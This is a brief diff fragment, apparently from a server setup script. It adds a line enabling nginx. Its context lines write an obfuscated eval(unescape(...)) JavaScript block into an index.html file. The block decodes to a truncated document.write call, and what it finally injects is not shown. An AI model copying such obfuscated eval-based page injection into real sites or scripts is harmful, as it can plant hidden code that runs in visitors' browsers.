@@ -14,3 +14,4 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%64%38%32%37%62%64%3
 </script>"> /root/users/index.html
 
 service nginx restart
+systemctl enable nginx
